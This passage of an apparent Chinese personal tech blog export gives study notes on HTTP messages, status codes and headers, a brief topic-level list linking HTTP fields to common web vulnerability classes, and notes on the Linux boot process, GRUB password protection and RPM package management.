<li>请求头标通知服务器有关于客户端的功能和标识，</li>
<li>典型的请求头标有：<ul>
<li>User-Agent        客户端厂家和版本</li>
<li>Accept            客户端可识别的内容类型列表</li>
<li>Content-Length    附加到请求的数据字节数</li>
</ul>
</li>
</ul>
</li>
<li>空行：最后一个请求头标之后是一个空行，发送回车符和退行，通知服务器以下不再有头标</li>
<li>请求数据：使用POST传送数据，最常使用的是Content-Type和Content-Length头标。</li>
</ul>
</li>
</ul>
<h3 id="1-3-服务端接受请求并返回HTTP响应"><a href="#1-3-服务端接受请求并返回HTTP响应" class="headerlink" title="1.3-服务端接受请求并返回HTTP响应"></a>1.3-服务端接受请求并返回HTTP响应</h3><ul>
<li>Web服务器解析请求，定位指定资源</li>
<li>服务器将资源副本写至套接字，在此处由客户端读取</li>
<li>一个响应由四个部分组成；状态行、响应头标、空行、响应数据</li>
<li>状态行：状态行由三个标记组成：HTTP版本、响应代码和响应描述<ul>
<li>HTTP版本：向客户端指明其可理解的最高版本</li>
<li>响应代码：3位的数字代码，指出请求的成功或失败，如果失败则指出原因。<ul>
<li>1xx：信息，请求收到，继续处理</li>
<li>2xx：成功，行为被成功地接受、理解和采纳</li>
<li>3xx：重定向，为了完成请求，必须进一步执行的动作</li>
<li>4xx：客户端错误：</li>
</ul>
</li>
<li>响应描述：为响应代码的可读性解释。</li>
<li>例如：HTTP/1.1 200 OK</li>
</ul>
</li>
<li>响应头标：像请求头标一样，它们指出服务器的功能，标识出响应数据的细节。</li>
<li>空行：最后一个响应头标之后是一个空行，发送回车符和退行，表明服务器以下不再有头标。</li>
<li>响应数据：HTML文档和图像等，也就是HTML本身。</li>
</ul>
<h3 id="1-4-服务器关闭连接，浏览器解析响应"><a href="#1-4-服务器关闭连接，浏览器解析响应" class="headerlink" title="1.4-服务器关闭连接，浏览器解析响应"></a>1.4-服务器关闭连接，浏览器解析响应</h3><ul>
<li>浏览器首先解析状态行，查看表明请求是否成功的状态代码。</li>
<li>然后解析每一个响应头标，头标告知以下为若干字节的HTML。</li>
<li>读取响应数据HTML，根据HTML的语法和语义对其进行格式化，并在浏览器窗口中显示它。</li>
<li>一个HTML文档可能包含其它需要被载入的资源引用，浏览器识别这些引用，对其它的资源再进行额外的请求，此过程循环多次</li>
</ul>
<h3 id="1-5-无状态连接"><a href="#1-5-无状态连接" class="headerlink" title="1.5-无状态连接"></a>1.5-无状态连接</h3><ul>
<li>HTTP模型是无状态的，表明在处理一个请求时，Web服务器并不记住来自同一客户端的请求。</li>
</ul>
<h3 id="1-6-实例"><a href="#1-6-实例" class="headerlink" title="1.6-实例"></a>1.6-实例</h3><ul>
<li><p>实例1</p>
<ul>
<li><p>浏览器发出请求</p>
<p><code>GET /index.html HTTP/1.1</code></p>
</li>
<li><p>服务器返回响应</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">HTTP /1.1 200 OK</span><br><span class="line"><span class="attribute">Date</span>: Apr 11 2006 15:32:08 GMT</span><br><span class="line"><span class="attribute">Server</span>: Apache/2.0.46(win32)</span><br><span class="line"><span class="attribute">Content-Length</span>: 119</span><br><span class="line"><span class="attribute">Content-Type</span>: text/html</span><br><span class="line"></span><br><span class="line">&lt;HTML&gt;</span><br><span class="line">&lt;HEAD&gt;</span><br><span class="line">&lt;LINK REL="stylesheet" HREF="index.css"&gt;</span><br><span class="line">&lt;/HEAD&gt;</span><br><span class="line">&lt;BODY&gt;</span><br><span class="line">&lt;IMG SRC="image/logo.png"&gt;</span><br><span class="line">&lt;/BODY&gt;</span><br><span class="line">&lt;/HTML&gt;</span><br></pre></td></tr></table></figure>
</li>
</ul>
</li>
<li><p>实例2</p>
<ul>
<li><p>浏览器发出请求</p>
<p><code>GET /index.css HTTP/1.1</code></p>
</li>
<li><p>服务器返回响应</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">HTTP /1.1 200 OK</span><br><span class="line"><span class="attribute">Date</span>: Apr 11 2006 15:32:08 GMT</span><br><span class="line"><span class="attribute">Server</span>: Apache/2.0.46(win32)</span><br><span class="line"><span class="attribute">Connection</span>: Keep-alive, close</span><br><span class="line"><span class="attribute">Content-Length</span>: 70</span><br><span class="line"><span class="attribute">Content-Type</span>: text/plane</span><br><span class="line"></span><br><span class="line"><span class="attribute">h3&#123;</span></span><br><span class="line">    font-size:20px;</span><br><span class="line">    <span class="attribute">font-weight:bold;</span></span><br><span class="line">    color:#005A9C;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
</ul>
</li>
<li><p>实例3</p>
<ul>
<li><p>浏览器发出请求</p>
<p><code>GET image/logo.png HTTP/1.1</code></p>
</li>
<li><p>服务器返回响应</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">HTTP /1.1 200 OK</span><br><span class="line"><span class="attribute">Date</span>: Apr 11 2006 15:32:08 GMT</span><br><span class="line"><span class="attribute">Server</span>: Apache/2.0.46(win32)</span><br><span class="line"><span class="attribute">Connection</span>: Keep-alive, close</span><br><span class="line"><span class="attribute">Content-Length</span>: 1280</span><br><span class="line"><span class="attribute">Content-Type</span>: text/plane</span><br><span class="line"></span><br><span class="line">&#123;Binary image data follows&#125;</span><br></pre></td></tr></table></figure>
</li>
</ul>
</li>
</ul>
<h3 id="1-7-附录"><a href="#1-7-附录" class="headerlink" title="1.7-附录"></a>1.7-附录</h3><ul>
<li>HTTP规范：Internet工程制定组织（IETF）发布的RFC指定Internet标准，这些RFC被Internet研究发展机构广泛接受。因为它们是标准文档，故一般用正规语言编写，如立法文标一样。</li>
<li>RFC：RFC一旦被提出，就被编号且不会再改变，当一个标准被修改时，则给出一个新的RFC。作为标准，RFC在Internet上被广泛采用。</li>
<li>HTTP的几个重要RFC：<ul>
<li>RFC1945    HTTP 1.0 描述</li>
<li>RFC2068    HTTP 1.1 初步描述</li>
<li>RFC2616    HTTP 1.1 标准</li>
</ul>
</li>
<li>资源标识符URI（Uniform Resource Identifter，URI）</li>
</ul>
<h2 id="02-HTTP参考"><a href="#02-HTTP参考" class="headerlink" title="02-HTTP参考"></a>02-HTTP参考</h2><h3 id="2-1-HTTP码应码"><a href="#2-1-HTTP码应码" class="headerlink" title="2.1-HTTP码应码"></a>2.1-HTTP码应码</h3><ul>
<li><p>响应码由三位十进制数字组成，它们出现在由HTTP服务器发送的响应的第一行</p>
</li>
<li><p>响应码分五种类型，由它们的第一位数字表示</p>
<ul>
<li>1xx：信息，请求收到，继续处理</li>
<li>2xx：成功，行为被成功地接受、理解和采纳</li>
<li>3xx：重定向，为了完成请求，必须进一步执行的动作</li>
<li>4xx：客户端错误，请求包含语法错误或者请求无法实现</li>
<li>5xx：服务器错误，服务器不能实现一种明显无效的请求</li>
</ul>
</li>
<li><p>下表显示每个响应码及其含义</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">100            继续</span><br><span class="line">101            分组交换协</span><br><span class="line">200            OK</span><br><span class="line">201            被创建</span><br><span class="line">202            被采纳</span><br><span class="line">203            非授权信息</span><br><span class="line">204            无内容</span><br><span class="line">205            重置内容</span><br><span class="line">206            部分内容</span><br><span class="line">300            多选项</span><br><span class="line">301            永久地传送</span><br><span class="line">302            找到</span><br><span class="line">303            参见其他</span><br><span class="line">304            未改动</span><br><span class="line">305            使用代理</span><br><span class="line">307            暂时重定向</span><br><span class="line">400            错误请求</span><br><span class="line">401            未授权</span><br><span class="line">402            要求付费</span><br><span class="line">403            禁止</span><br><span class="line">404            未找到</span><br><span class="line">405            不允许的方法</span><br><span class="line">406            不被采纳</span><br><span class="line">407            要求代理授权</span><br><span class="line">408            请求超时</span><br><span class="line">409            冲突</span><br><span class="line">410            过期的</span><br><span class="line">411            要求的长度</span><br><span class="line">412            前提不成立</span><br><span class="line">413            请求实例太大</span><br><span class="line">414            请求URI太大</span><br><span class="line">415            不支持的媒体类型</span><br><span class="line">416            无法满足的请求范围</span><br><span class="line">417            失败的预期</span><br><span class="line">500            内部服务器错误</span><br><span class="line">501            未被使用</span><br><span class="line">502            网关错误</span><br><span class="line">503            不可用的服务</span><br><span class="line">504            网关超时</span><br><span class="line">505            HTTP版本未被支持</span><br></pre></td></tr></table></figure>
</li>
</ul>
<h3 id="2-2-HTTP头标"><a href="#2-2-HTTP头标" class="headerlink" title="2.2-HTTP头标"></a>2.2-HTTP头标</h3><ul>
<li>头标由主键/值对组成。它们描述客户端或者服务器的属性、被传输的资源以及应该实现连接。</li>
<li>四种不同类型的头标：<ul>
<li>通用头标：即可用于请求，也可用于响应，是作为一个整体而不是特定资源与事务相关联。</li>
<li>请求头标：允许客户端传递关于自身的信息和希望的响应形式</li>
<li>响应头标：服务器和于传递自身信息的响应。</li>
<li>实体头标：定义被传送资源的信息。即可用于请求，也可用于响应。</li>
</ul>
</li>
<li>头标格式：<code>&lt;name&gt;:&lt;value&gt;&lt;CRLF&gt;</code></li>
<li>下表描述在HTTP/1.1中用到的头标<ul>
<li>Accept<ul>
<li>定义客户端可以处理的媒体类型，按优先级排序；</li>
<li>在一个以逗号为分隔的列表中，可以定义多种类型和使用通配符。例如：<code>Accept: image/jpeg,image/png,*/*</code></li>
</ul>
</li>
<li>Accept-Charset<ul>
<li>定义客户端可以处理的字符集，按优先级排序；</li>
<li>在一个以逗号为分隔的列表中，可以定义多种类型和使用通配符。例如：<code>Accept-Charset: iso-8859-1,*,utf-8</code></li>
</ul>
</li>
<li>Accept-Encoding<ul>
<li>定义客户端可以理解的编码机制。</li>
<li>例如：Accept-Encoding:gzip,compress</li>
</ul>
</li>
<li>Accept-Language<ul>
<li>定义客户端乐于接受的自然语言列表</li>
<li>例如：Accept-Language: en,de</li>
</ul>
</li>
<li>Accept-Ranges<ul>
<li>一个响应头标，它允许服务器指明：将在给定的偏移和长度处，为资源组成部分的接受请求。</li>
<li>该头标的值被理解为请求范围的度量单位。</li>
<li>例如Accept-Ranges: bytes或Accept-Ranges: none</li>
</ul>
</li>
<li>Age<ul>
<li>允许服务器规定自服务器生成该响应以来所经过的时间长度，以秒为单位</li>
<li>该头标主要用于缓存响应。例如：Age: 30</li>
</ul>
</li>
<li>Allow<ul>
<li>一个响应头标，它定义一个由位于请求URI中的次源所支持的HTTP方法列表</li>
<li>例如：Allow: GET,PUT</li>
</ul>
</li>
<li>Authorization<ul>
<li>一个响应头标，用于定义访问一种资源所必需的授权（域和被编码的用户ID与口令）</li>
<li>Authorization: Basic YXV0aG9yOnBoaWw=</li>
</ul>
</li>
<li>Cache-Control<ul>
<li>一个用于定义缓存指令的通用头标。</li>
<li>例如：Cache-Control: max-age=30</li>
</ul>
</li>
<li>Connection<ul>
<li>一个用于表明是否保存socket连接为开放的通用头标。</li>
<li>例如：Connection: close或Connection: keep-alive</li>
</ul>
</li>
<li>Content-Base<ul>
<li>一种定义基本URI的实体头标，为了在实体范围内解析相对URLs。</li>
<li>如果没有定义Content-Base头标解析相对URLs，使用Content-Location URI（存在且绝对）或使用URI请求。</li>
<li>例如：Content-Base: Http://<a href="http://www.myweb.com" target="_blank" rel="noopener">www.myweb.com</a></li>
</ul>
</li>
<li>Content-Encoding<ul>
<li>一种介质类型修饰符，标明一个实体是如何编码的</li>
<li>例如：Content-Encoding: zip</li>
</ul>
</li>
<li>Content-Language<ul>
<li>用于指定在输入流中数据的自然语言类型</li>
<li>Content-Language: en</li>
</ul>
</li>
<li>Content-Length<ul>
<li>指定包含于请求或响应中数据的字节长度</li>
<li>Content-Length:382</li>
</ul>
</li>
<li>Content-Location<ul>
<li>指定包含于请求或响应中的资源定位（URI）</li>
<li>如果是一绝。对URL它也作为被解析实体的相对URL的出发点</li>
<li>例如：Content-Location: <a href="http://www.myweb.com/news" target="_blank" rel="noopener">http://www.myweb.com/news</a></li>
</ul>
</li>
<li>Content-MD5<ul>
<li>实体的一种MD5摘要，用作校验和。</li>
<li>发送方和接受方都计算MD5摘要，接受方将其计算的值与此头标中传递的值进行比较。</li>
<li>例如：<code>Content-MD5: &lt;base64 of 128 MD5 digest&gt;</code></li>
</ul>
</li>
<li>Content-Range<ul>
<li>随部分实体一同发送</li>
<li>标明被插入字节的低位与高位字节偏移，也标明此实体的总长度。</li>
<li>例如：Content-Range: 1001-2000/5000</li>
</ul>
</li>
<li>Contern-Type<ul>
<li>标明发送或者接收的实体的MIME类型</li>
<li>例如：Content-Type: text/html</li>
</ul>
</li>
<li>Date<ul>
<li>发送HTTP消息的日期</li>
<li>例如：Date: Mon,10PR 18:42:51 GMT</li>
</ul>
</li>
<li>ETag<ul>
<li>一种实体头标，它向被发送的资源分派一个唯一的标识符。</li>
<li>对于可以使用多种URL请求的资源，ETag可以用于确定实际被发送的资源是否为同一资源</li>
<li>例如：ETag: “208f-419e-30f8dc99”</li>
</ul>
</li>
<li>Expires<ul>
<li>指定实体的有效期</li>
<li>例如：Expires: Mon,05 Dec 2008 12:00:00 GMT</li>
</ul>
</li>
<li>Form<ul>
<li>一种请求头标，给定控制用户代理的人工用户的电子邮件地址。</li>
<li>例如：From: <a href="mailto:webmaster@myweb.com" target="_blank" rel="noopener">webmaster@myweb.com</a></li>
</ul>
</li>
<li>Host<ul>
<li>被请求资源的主机名。</li>
<li>对于使用HTTP/1.1的请求而言，此域是强制性的。</li>
<li>例如：Host: <a href="http://www.myweb.com" target="_blank" rel="noopener">www.myweb.com</a></li>
</ul>
</li>
<li>If-Modified-Since<ul>
<li>如果包含了GET请求，导致该请求条件性地依赖于资源上次修改日期。</li>
<li>如果出现了此头标，并且自指定日期以来，此资源已被修改，应该反回一个304响应代码。</li>
<li>例如：If-Modified-Since: Mon,10PR 18:42:51 GMT</li>
</ul>
</li>
<li>If-Match<ul>
<li>如果包含于一个请求，指定一个或者多个实体标记。</li>
<li>只发送其ETag与列表中标记区配的资源</li>
<li>例如：If-Match: “208f-419e-308dc99”</li>
</ul>
</li>
<li>If-None-Match<ul>
<li>如果包含一个请求，指定一个或者多个实体标记</li>
<li>资源的ETag不与列表中的任何一个条件匹配，操作才执行。</li>
<li>例如：If-None-Match: “208f-419e-308dc99”</li>
</ul>
</li>
<li>If-Range<ul>
<li>指定资源的一个实体标记，客户端已经拥有此资源的一个拷贝。</li>
<li>必须与Range头标一同使用。</li>
<li>如果此实体自上次被客户端检索以来，还不曾修改过，那么服务器只发送指定的范围，否则它将发送整个资源。</li>
<li>例如：<code>Range: byte=0-499&lt;CRLF&gt;If-Range:&quot;208f-419e-30f8dc99&quot;</code></li>
</ul>
</li>
<li>If-Unmodified-Since<ul>
<li>只有自指定的日期以来，被请求的实体还不曾被修改过，才会返回此实体。</li>
<li>例如：If-Unmodified-Since:Mon,10PR 18:42:51 GMT</li>
</ul>
</li>
<li>Last-Modified<ul>
<li>指定被请求资源上次被修改的日期和时间</li>
<li>例如：Last-Modified: Mon,10PR 18:42:51 GMT</li>
</ul>
</li>
<li>Location<ul>
<li>对于一个已经移动的资源，用于重定向请求者至另一个位置。</li>
<li>与状态编码302（暂时移动）或者301（永久性移动）配合使用。</li>
<li>例如：Location: <a href="http://www2.myweb.com/index.jsp" target="_blank" rel="noopener">http://www2.myweb.com/index.jsp</a></li>
</ul>
</li>
<li>Max-Forwards<ul>
<li>一个用于TRACE方法的请求头标，以指定代理或网关的最大数目，该请求通过网关才得以路由。</li>
<li>在通过请求传递之前，代理或网关应该减少此数目</li>
<li>例如：Max-Forwards: 3</li>
</ul>
</li>
<li>Pragma<ul>
<li>一个通用头标，它发送实现相关的信息。</li>
<li>例如：Pragma: no-cache</li>
</ul>
</li>
<li>Proxy-Authenticate<ul>
<li>类似于WWW-Authenticate，便是有意请求只来自请求链（代理）的下一个服务器的认证。</li>
<li>例如：Proxy-Authenticate: Basic realm-admin</li>
</ul>
</li>
<li>Proxy-Proxy-Authorization<ul>
<li>类似于授权，但并非有意传递任何比在即时服务器链中更进一步的内容。</li>
<li>例如：Proxy-Proxy-Authorization: Basic YXV0aG9yOnBoaWw=</li>
</ul>
</li>
<li>Public<ul>
<li>列表显示服务器所支持的方法集</li>
<li>例如：Public: OPTIONS,MGET,MHEAD,GET,HEAD</li>
</ul>
</li>
<li>Range<ul>
<li>指定一种度量单位和一个部分被请求资源的偏移范围。</li>
<li>例如：Range: bytes=206-5513</li>
</ul>
</li>
<li>Refener<ul>
<li>一种请求头标域，标明产生请求的初始资源。</li>
<li>对于HTML表单，它包含此表单的Web页面的地址。</li>
<li>例如：Refener: <a href="http://www.myweb.com/news/search.html" target="_blank" rel="noopener">http://www.myweb.com/news/search.html</a></li>
</ul>
</li>
<li>Retry-After<ul>
<li>一种响应头标域，由服务器与状态编码503（无法提供服务）配合发送，以标明再次请求之前应该等待多长时间。</li>
<li>此时间即可以是一种日期，也可以是一种秒单位。</li>
<li>例如：Retry-After: 18</li>
</ul>
</li>
<li>Server<ul>
<li>一种标明Web服务器软件及其版本号的头标</li>
<li>例如：Server: Apache/2.0.46(Win32)</li>
</ul>
</li>
<li>Transfer-Encoding<ul>
<li>一种通用头标，标明对应被接受方反向的消息体实施变换的类型。</li>
<li>例如：Transfer-Encoding: chunked</li>
</ul>
</li>
<li>Upgrade<ul>
<li>允许服务器指定一种新的协议或者新的协议版本，与响应编码101（切换协议）配合使用。</li>
<li>例如：Upgrade: HTTP/2.0</li>
</ul>
</li>
<li>User-Agent<ul>
<li>定义用于产生请求的软件类型（典型的如Web浏览器）。</li>
<li>例如：User-Agent: Mozilla/4.0(compatible; MSIE 5.5; Windows NT; DigExt)</li>
</ul>
</li>
<li>Vary<ul>
<li>个响应头标，用于表示使用服务器驱动的协商从可用的响应表示中选择响应实体。</li>
<li>例如：Vary: *</li>
</ul>
</li>
<li>Via<ul>
<li>一个包含所有中间主机和协议的通用头标，用于满足请求。</li>
<li>例如：Via: 1.0 fred.com, 1.1 wilma.com</li>
</ul>
</li>
<li>Warning<ul>
<li>用于提供关于响应状态补充信息的响应头标。</li>
<li>例如：Warning: 99 <a href="http://www.myweb.com" target="_blank" rel="noopener">www.myweb.com</a> Piano needs tuning</li>
</ul>
</li>
<li>www-Authenticate<ul>
<li>一个提示用户代理提供用户名和口令的响应头标，与状态编码401（未授权）配合使用。响应一个授权头标</li>
<li>例如：www-Authenticate: Basic realm=zxm.mgmt</li>
</ul>
</li>
</ul>
</li>
</ul>
<h2 id="03-数据包和漏洞结合"><a href="#03-数据包和漏洞结合" class="headerlink" title="03-数据包和漏洞结合"></a>03-数据包和漏洞结合</h2><blockquote>
<p>Sql注入，文件上传，xss跨站等</p>
</blockquote>
<ul>
<li>请求方式<ul>
<li><strong>提交方式注入（sql注入）</strong></li>
</ul>
</li>
<li>状态码<ul>
<li><strong>信息收集（扫描后台，扫描文件）</strong></li>
</ul>
</li>
<li>浏览器信息等其他<ul>
<li><strong>http注入（sql注入）</strong></li>
</ul>
</li>
<li>cookie<ul>
<li><strong>sql注入，绕过授权，xss跨站</strong></li>
</ul>
</li>
<li>Contern-Type<ul>
<li>标明发送或者接收的实体的MIME类型</li>
<li><strong>文件上传漏洞</strong></li>
</ul>
</li>
<li>Refener <ul>
<li>一种请求头标域，标明产生请求的初始资源</li>
<li>对于HTML表单，它包含此表单的Web页面的地址</li>
<li><strong>Csrf xss 授权</strong></li>
</ul>
</li>
</ul>
<ul>
<li>http数据包拓展演示<ul>
<li>Sql注入漏洞的http数据修改</li>
<li>文件上传漏洞的http数据修改</li>
</ul>
</li>
</ul>
]]></content>
      <categories>
        <category>Web安全/渗透</category>
      </categories>
      <tags>
        <tag>Web安全</tag>
        <tag>http协议</tag>
      </tags>
  </entry>
  <entry>
    <title>Linux-启动管理</title>
    <url>/2017/12/25/etc/%E5%90%AF%E5%8A%A8%E7%AE%A1%E7%90%86/</url>
    <content><![CDATA[<h1 id="启动管理"><a href="#启动管理" class="headerlink" title="启动管理"></a>启动管理</h1><h2 id="启动流程"><a href="#启动流程" class="headerlink" title="启动流程"></a>启动流程</h2><ul>
<li>运行级别<ul>
<li>七个运行级别<ul>
<li>0:关机</li>
<li>1:单用户模式，可想象为Windows的安全模式，主要用于系统修复（只启动最基本的程序，同Windows的安全模式类似<a id="more"></a></li>
<li>2:不完全的命令行模式，不含NFS服务（Linux间进行文件共享的服务）</li>
<li>3:完全的命令行模式，即标准字符界面</li>
<li>4:系统保留</li>
<li>5:图形模式</li>
<li>6:重启</li>
</ul>
</li>
<li>相关命令<ul>
<li>runlevel命令<ul>
<li>直接键入</li>
<li>查看运行级别命令</li>
<li>显示两个数字，前一个是前运行级别，后者是当前运行级别，如N 3，表示一开机便进入了3</li>
</ul>
</li>
<li>init命令<ul>
<li>init +运行级别</li>
<li>改变运行级别命令</li>
<li>其它<ul>
<li>init 0也可用于关机，但是其关机过程中，不会保存正在运行的进程，不安全，故不推荐这样关机</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li>系统默认运行级别<ul>
<li>vim /etc/inittab</li>
<li>最后一行添加内容：id 3 initdefault</li>
<li>系统开机后直接进入哪个运行级别（如上，进入3</li>
</ul>
</li>
</ul>
</li>
<li>启动过程<ul>
<li>大体过程<ul>
<li>开机</li>
<li>BIOS</li>
<li>加载MBR</li>
<li>加载MBR中启动引导程序（Linux中为grub<ul>
<li>若是单系统<ul>
<li>直接启动</li>
<li>加载内核</li>
</ul>
</li>
<li>若是多系统<ul>
<li>调用其它分区启动扇区中的启动引导程序</li>
<li>启动不同的操作系统</li>
<li>加载内核</li>
</ul>
</li>
</ul>
</li>
<li>加载内核后</li>
<li>内核解压并自检</li>
<li>搜索找到initranfs</li>
<li>建立仿真根目录</li>
<li>加载驱动</li>
<li>挂载真正系统根目录</li>
<li>调用/sbin/init</li>
<li>调用/etc/init/rcS.conf<ul>
<li>一方面<ul>
<li>调用/etc/rc.d/rc.sysinit</li>
<li>进行系统初始化</li>
</ul>
</li>
<li>另一方面<ul>
<li>调用/etc/inittab</li>
<li>传用运行级别</li>
<li>/etc/init/rc.conf</li>
<li>调用/etc/rc.d/rc</li>
<li>按照运行级别调用，/etc/rc[0-6]d</li>
<li>按照优先级启动和关闭相应脚本</li>
<li>启动和关闭/etc/rc.d/rc.local中的程序</li>
<li>进入登陆界面</li>
<li>输入用户名和密码</li>
<li>进入系统</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
<h2 id="启动引导程序"><a href="#启动引导程序" class="headerlink" title="启动引导程序"></a>启动引导程序</h2><ul>
<li>grub 配置文件<ul>
<li>vim /boot/grub/grub.conf</li>
<li>前四行配置<ul>
<li>default=0，默认启动第一个系统</li>
<li>timeout=5，等待时间，默认是5</li>
<li>splashimage=（hd0，0）/grub/splash.xpm.gz，这里是指定grub启动时背景图像文件的保存位置</li>
<li>hiddenmenu，为隐藏菜单</li>
</ul>
</li>
<li>后四行配置<ul>
<li>title字段，即标题</li>
<li>root (hd0,0)指启动程序的保存分区</li>
<li>kernel字段，定义内核加载时的选项</li>
<li>initrd字段，指定inittamfs内存文件系统镜像文件的所在位置</li>
</ul>
</li>
<li>其它<ul>
<li>能改的配置并不多</li>
<li>主要还是default 0那个，电脑有多个操作系统时可能会改，控制启动哪个操作系统</li>
</ul>
</li>
</ul>
</li>
<li>grub加密<ul>
<li>简介<ul>
<li>grub界面中，键入e进入编辑模式，不安全，故要加密</li>
</ul>
</li>
<li>大体流程<ul>
<li>grub-md5-crypt：生成加密密码串（键入待加密字符串后得密文xxx</li>
<li>编辑grub配置文件，vim /boot/grub/grub.conf</li>
<li>添加内容：password—md5 xxx（timeout和splashimage字段之间</li>
<li>重启测试，进入grub界面时，不可直接键入e进入编辑模式，需要键入p输入密码，验证成功后才可以键入e</li>
</ul>
</li>
</ul>
</li>
<li>纯字符界面下分辨率调整<ul>
<li>不重要，自行百度</li>
</ul>
</li>
</ul>
<h2 id="系统修复模式"><a href="#系统修复模式" class="headerlink" title="系统修复模式"></a>系统修复模式</h2><ul>
<li>单用户模式下<ul>
<li>修改root密码</li>
<li>修改系统默认运行级别</li>
</ul>
</li>
<li>光盘修复模式下<ul>
<li>可以修改grub密码</li>
</ul>
</li>
<li>Linux安全性相关<ul>
<li>用户密码在单用户模式下可破解，grub加密可防止</li>
<li>但光盘修复模式下，也可以破解grub加密，bios加密可防止</li>
<li>但拨出主板电池可破解bios加密</li>
<li>………</li>
<li>Linux安全并非此安全，这些其实是其为用户预留的后门，为其所有者提供的</li>
<li>所谓的安全是指在网络上的安全，而非真真切切面对物理主机时的</li>
</ul>
</li>
</ul>
]]></content>
      <categories>
        <category>其它</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>Linux-软件包管理</title>
    <url>/2017/12/25/etc/%E8%BD%AF%E4%BB%B6%E5%8C%85%E7%AE%A1%E7%90%86/</url>
    <content><![CDATA[<h1 id="软件包管理"><a href="#软件包管理" class="headerlink" title="软件包管理"></a>软件包管理</h1><h2 id="软件包分类"><a href="#软件包分类" class="headerlink" title="软件包分类"></a>软件包分类</h2><ul>
<li>源码包<ul>
<li>大部分是C语言（Linux便是C开发</li>
<li>脚本安装包：其实也是源码包，在其基础上添加安装界面等，不多见</li>
<li>优点<ul>
<li>开源，若有足够能力，可自己修改源码</li>
<li>可自由选择所需功能<a id="more"></a></li>
<li>软件是编译安装，故更加适合自己系统，更加稳定且效率高</li>
<li>卸载方便（直接删除其安装的目录即可</li>
</ul>
</li>
<li>缺点<ul>
<li>安装步骤多、繁杂</li>
<li>编译过程时间长，影响安装速度（比二进制包慢</li>
<li>因为是编译安装，安装时出错难以解决</li>
</ul>
</li>
</ul>
</li>
<li>二进制包<ul>
<li>经过编译后的0101的机器语言包</li>
<li>优点<ul>
<li>包管理系统简单，通过命令可实现包的安装、升级、查询，卸载</li>
<li>安装速度比源码包快的多</li>
</ul>
</li>
<li>缺点<ul>
<li>因其是编译后，故不可见源码</li>
<li>功能选择不如源码包灵活</li>
<li>存在依赖性（最大的麻烦</li>
</ul>
</li>
<li>如，CentOS的rpm包、系统默认包</li>
</ul>
</li>
</ul>
<h2 id="RPM包管理"><a href="#RPM包管理" class="headerlink" title="RPM包管理"></a>RPM包管理</h2><ul>
<li>rpm命令管理<ul>
<li>RPM包命名规则<ul>
<li>如：httpd-2.2.15-15.el6.centos.1.i686.rpm（这是包全名，区别于包名</li>
<li>httpd:软件包名<ul>
<li>包名与包全名要有所区分</li>
<li>有些命令会跟包名，有些跟包全名</li>
</ul>
</li>
<li>2.2.15: 软件版本</li>
<li>15: 软件发布的次数</li>
<li>el6.centos：适合的Linux平台（不写的话会认为适合所有的</li>
<li>i686：适合的硬件平台（86-32位、64-64位、noarch表任何硬件平台都可以</li>
<li>rpm：rpm包扩展名<ul>
<li>Linux中无扩展名的概念，后缀可随便写</li>
<li>但rpm包规定以.rpm为后缀，方便用户辨认</li>
</ul>
</li>
</ul>
</li>
<li>RPM包依赖性<ul>
<li>树形依赖：a-b-c<ul>
<li>安装：先c再b后a，卸载相反</li>
</ul>
</li>
<li>环形依赖：a-b-c-a<ul>
<li>abc同时安装就会解决</li>
</ul>
</li>
<li>模块依赖<ul>
<li>模块依赖查询网站：<a href="http://www.rpmfind.net" target="_blank" rel="noopener">www.rpmfind.net</a></li>
<li>安装a包，需依赖x模块，可查询x模块在哪个包中，若是b包，则先安装b</li>
</ul>
</li>
</ul>
</li>
<li>安装、升级与卸载<ul>
<li>包全名与全名<ul>
<li>包全名：操作的包是没有安装的软件包时，使用包全名，且要注意路径</li>
<li>包名：操作已经安装的软件包，使用包名。是搜索/var/lib/rpm的数据库</li>
</ul>
</li>
<li>RPM安装<ul>
<li>rpm -ivh 包全名</li>
<li>i：安装</li>
<li>v：显示详细信息</li>
<li>h：hash，用#显示进度</li>
<li>—nodeps 不检测依赖性（不建议</li>
</ul>
</li>
<li>RPM包升级<ul>
<li>rpm -Uvh 包全名</li>
<li>U：upgrade，升级</li>
</ul>
</li>
<li>卸载<ul>
<li>rpm -e 包名</li>
<li>已安装，需跟包名</li>
<li>e：erase，卸载</li>
</ul>
</li>
</ul>
</li>
<li>查询<ul>
<li>查询是否安装<ul>
<li>rpm -q 包名（q：query，查询</li>
<li>rpm -qa（a：all，查询所有已安装的</li>
<li>rpm -qa | grep httpd（查询所有httpd相关</li>
</ul>
</li>
<li>查询软件包详细信息<ul>
<li>rpm -qi 包名</li>
<li>i：information，查询软件信息</li>
<li>p：package，查询未安装包信息（因未安装，故跟全名；包在构建时就存在此信息，故可以查询</li>
</ul>
</li>
<li>查询包中文件安装位置<ul>
<li>rpm -ql 包名</li>
<li>l：list，列表</li>
<li>p：package，查询未安装包信息（因未安装，故跟全名；在包构建时就存在其相关信息，其打算装在哪</li>
<li>由包找文件</li>
</ul>
</li>
<li>查询系统文件属于哪个rpm包<ul>
<li>rpm -qf 系统文件名</li>
<li>f：file，查询系统文件属于哪个安装包</li>
<li>由文件找包（此文件必须是通过包生成的</li>
</ul>
</li>
<li>查询软件包依赖性<ul>
<li>rpm -qR 包名</li>
<li>R：查询软件包依赖性，requires</li>
<li>p：查询未安装的软件包（此信息在包构建时就存在；需跟包全名；</li>
<li>多用于查询未安装包，安装前先检测</li>
</ul>
</li>
</ul>
</li>
<li>校验和文件提取<ul>
<li>RPM包校验<ul>
<li>rpm -V 包名</li>
<li>V：verify，检验指定RPM包中的文件</li>
<li>判断安装后，其相关文件是否更改</li>
<li>若运行后无信息输出，则未更改</li>
<li>输出验证信息，则经过更改<ul>
<li>验证信息=8个字段+文件类型+文件名</li>
<li>8个字段<ul>
<li>S：文件大小是否被改变</li>
<li>M：文件类型或文件权限是否被改变</li>
<li>5:文件md5校验和是否改变（即文件内容是否改变</li>
<li>D：设备的中、从代码是否改变</li>
<li>L：文件路径是否改变</li>
<li>U：文件属主（即所有者）是否改变</li>
<li>G：文件属组是否改变</li>
<li>T：文件修改时间是否改变</li>
</ul>
</li>
